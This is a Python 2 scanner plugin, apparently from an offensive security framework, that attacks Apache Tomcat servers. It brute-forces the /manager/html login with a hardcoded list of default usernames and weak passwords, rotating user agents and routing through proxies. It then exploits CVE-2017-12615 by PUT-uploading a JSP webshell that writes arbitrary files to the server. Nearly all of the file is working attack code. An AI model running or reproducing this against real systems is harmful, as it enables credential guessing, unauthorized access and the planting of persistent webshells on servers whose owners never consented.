#!/usr/bin/env python
#-*-coding:utf-8-*-
import lib.requests as requests
import logging
import random
import base64
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def plugin_info():
    return {
        "name": "tomcat_vul",
        "info": "tomcat弱口令和远程代码执行CVE-2017-12615",
        "Author":"Jaqen",
        "Create_date":"2017-10-01"
    }

def exploit(ip):
    result = []
    if Domain:
        for domain in Domain:
                login_url = domain+'/manager/html'
                try:
                    resp = requests.get(login_url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                except Exception,e:
                    logging.error(e)
                    continue
                if resp.status_code == 401:
                    result.append('%s >>>> 存在Tomcat后台'%login_url)
                    flag_list=['Application Manager','Welcome']
                    user_list=['admin','manager','tomcat','apache','root']
                    pass_list=['','123456','12345678','123456789','admin123','123123','admin888','password','admin1','administrator','8888888','123123','admin','manager','tomcat','apache','root']
                    for user in user_list:
                        for password in pass_list:
                            try:
                                resp = requests.get(login_url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST),"Authorization": 'Basic '+base64.b64encode(user+":"+password)}, allow_redirects=True, verify=False)
                            except Exception,e:
                                logging.error(e)
                                continue
                            if resp.status_code == 401:
                                continue
                            for flag in flag_list:
                                if flag in resp.text:
                                    result.append('%s >>>> 存在Tomcat后台弱漏洞 %s:%s'%(login_url,user,password))
                body = """<%  if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>"""
                #body = '''upload success!'''
                try:
                    resp = requests.options(domain)
                    if 'allow' in resp.headers and resp.headers['allow'].find('PUT') > 0 :
                        url = domain+'/success.jsp/'
                        resp_put = requests.put(url, data=body, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, verify=False)
                        if resp_put.status_code  == 201 :
                            result.append('webshell:'+url[:-1])
                        elif resp_put.status_code == 204 :
                            result.append('%s >>>> 开启了PUT方法且webshell已存在'%domain)
                        else:
                            result.append('%s >>>> 开启了PUT方法'%domain)
                except Exception,e:
                    logging.error(e)
                    pass
        if len(result):
            return result
